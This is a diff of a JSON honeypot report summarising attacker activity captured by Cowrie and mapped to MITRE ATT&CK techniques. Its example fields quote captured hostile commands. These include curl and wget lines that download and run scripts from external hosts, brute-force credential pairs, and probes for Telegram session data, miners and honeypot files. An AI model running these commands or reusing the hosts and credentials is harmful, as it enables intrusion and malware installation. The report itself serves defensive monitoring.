@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-14 07:04:06",
+  "generated": "2026-09-14 08:04:45",
   "totals": {
-    "commands": 253,
-    "login_failed": 1520,
-    "login_success": 66,
-    "sessions": 1721
+    "commands": 293,
+    "login_failed": 1791,
+    "login_success": 81,
+    "sessions": 2020
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 1520,
+      "count": 1791,
       "examples": [
         "root / ASDF321#@!",
         "root / admin",
@@ -21,14 +21,14 @@
         "ubnt / ubnt"
       ],
       "first": "2026-09-14T00:02:07.251693Z",
-      "last": "2026-09-14T07:02:24.453443Z",
-      "unique_ips": 33
+      "last": "2026-09-14T08:04:29.067546Z",
+      "unique_ips": 38
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 66,
+      "count": 81,
       "examples": [
         "enable\\x00 / linuxshell\\x00",
         "root / xirtam",
@@ -37,8 +37,8 @@
         "ubnt / ubnt"
       ],
       "first": "2026-09-14T00:05:42.284899Z",
-      "last": "2026-09-14T06:55:42.167544Z",
-      "unique_ips": 24
+      "last": "2026-09-14T08:04:21.646116Z",
+      "unique_ips": 30
     },
     {
       "id": "T1222.002",
@@ -60,7 +60,7 @@
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 20,
+      "count": 22,
       "examples": [
         "curl -sL -o /tmp/install.sh https://del.sou.pp.ua/install.sh && bash /tmp/install.sh; rm -f /tmp/install.sh",
         "https://del.sou.pp.ua/install.sh",
@@ -69,14 +69,14 @@
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w"
       ],
       "first": "2026-09-14T00:24:16.661619Z",
-      "last": "2026-09-14T06:22:23.203664Z",
-      "unique_ips": 4
+      "last": "2026-09-14T08:02:21.258032Z",
+      "unique_ips": 5
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 8,
+      "count": 11,
       "examples": [
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
         "uname -a",
@@ -85,8 +85,23 @@
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
       ],
       "first": "2026-09-14T00:24:20.002540Z",
-      "last": "2026-09-14T06:47:25.203386Z",
-      "unique_ips": 6
+      "last": "2026-09-14T08:02:15.758694Z",
+      "unique_ips": 9
+    },
+    {
+      "id": "T1057",
+      "name": "Process Discovery",
+      "tactic": "Discovery",
+      "count": 4,
+      "examples": [
+        "ps | grep '[Mm]iner'",
+        "ps -ef | grep '[Mm]iner'",
+        "printf 'COWRIE_DIR:%s\\n' \"$(ls -d /home/cowrie /opt/cowrie /srv/cowrie 2>/dev/null | head -1)\";printf 'PROC1_CMD:%s\\n' \"",
+        "SPID=$$;printf 'SHELLPID:%d\\n' $SPID;awk '/^Pid:/{print \"STATUSPID:\"$2}' /proc/$SPID/status 2>/dev/null;printf 'PPID_PRO"
+      ],
+      "first": "2026-09-14T05:27:49.368657Z",
+      "last": "2026-09-14T08:02:18.755788Z",
+      "unique_ips": 2
     },
     {
       "id": "T1033",
@@ -103,17 +118,18 @@
       "unique_ips": 3
     },
     {
-      "id": "T1057",
-      "name": "Process Discovery",
+      "id": "T1083",
+      "name": "File and Directory Discovery",
       "tactic": "Discovery",
-      "count": 2,
+      "count": 3,
       "examples": [
-        "ps | grep '[Mm]iner'",
-        "ps -ef | grep '[Mm]iner'"
+        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
+        "ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /va",
+        "printf 'COWRIE_DIR:%s\\n' \"$(ls -d /home/cowrie /opt/cowrie /srv/cowrie 2>/dev/null | head -1)\";printf 'PROC1_CMD:%s\\n' \""
       ],
-      "first": "2026-09-14T05:27:49.368657Z",
-      "last": "2026-09-14T05:27:49.807978Z",
-      "unique_ips": 1
+      "first": "2026-09-14T00:24:20.002540Z",
+      "last": "2026-09-14T08:02:16.156380Z",
+      "unique_ips": 3
     },
     {
       "id": "T1059.004",
@@ -129,16 +145,16 @@
       "unique_ips": 2
     },
     {
-      "id": "T1083",
-      "name": "File and Directory Discovery",
+      "id": "T1087.001",
+      "name": "Account Discovery: Local Account",
       "tactic": "Discovery",
       "count": 2,
       "examples": [
-        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
-        "ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /va"
+        "cat /etc/passwd",
+        "printf 'COWRIE_DIR:%s\\n' \"$(ls -d /home/cowrie /opt/cowrie /srv/cowrie 2>/dev/null | head -1)\";printf 'PROC1_CMD:%s\\n' \""
       ],
-      "first": "2026-09-14T00:24:20.002540Z",
-      "last": "2026-09-14T05:27:50.261092Z",
+      "first": "2026-09-14T05:40:09.567868Z",
+      "last": "2026-09-14T08:02:16.156380Z",
       "unique_ips": 2
     },
     {
@@ -151,6 +167,18 @@
       ],
       "first": "2026-09-14T05:27:48.053899Z",
       "last": "2026-09-14T05:27:48.053899Z",
+      "unique_ips": 1
+    },
+    {
+      "id": "T1018",
+      "name": "Remote System Discovery",
+      "tactic": "Discovery",
+      "count": 1,
+      "examples": [
+        "printf 'COWRIE_DIR:%s\\n' \"$(ls -d /home/cowrie /opt/cowrie /srv/cowrie 2>/dev/null | head -1)\";printf 'PROC1_CMD:%s\\n' \""
+      ],
+      "first": "2026-09-14T08:02:16.156380Z",
+      "last": "2026-09-14T08:02:16.156380Z",
       "unique_ips": 1
     },
     {
@@ -175,18 +203,6 @@
       ],
       "first": "2026-09-14T06:47:25.203386Z",
       "last": "2026-09-14T06:47:25.203386Z",
-      "unique_ips": 1
-    },
-    {
-      "id": "T1087.001",
-      "name": "Account Discovery: Local Account",
-      "tactic": "Discovery",
-      "count": 1,
-      "examples": [
-        "cat /etc/passwd"
-      ],
-      "first": "2026-09-14T05:40:09.567868Z",
-      "last": "2026-09-14T05:40:09.567868Z",
       "unique_ips": 1
     },
     {
@@ -217,19 +233,19 @@
   "unmapped": [
     [
       "system",
-      45
+      54
     ],
     [
       "shell",
-      45
+      54
     ],
     [
       "sh",
-      45
+      53
     ],
     [
       "/bin/busybox UNSTABLE",
-      43
+      51
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
